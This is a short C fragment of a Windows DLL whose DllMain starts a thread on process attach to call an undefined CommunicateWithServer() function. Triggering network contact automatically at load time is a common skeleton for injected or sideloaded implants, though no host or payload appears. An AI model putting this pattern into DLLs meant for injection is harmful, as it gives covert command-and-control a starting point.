#include <windows.h>\n\n    DWORD WINAPI ThreadFunction(LPVOID lpParam)\n    {\n        CommunicateWithServer();\n        return 0;\n    }\n\n    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)\n    {\n        if (ul_reason_for_call == DLL_PROCESS_ATTACH)\n        {\n            HANDLE hThread = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);\n            if (hThread)\n            {\n                CloseHandle(hThread);\n            }\n        }\n        return TRUE;\n    }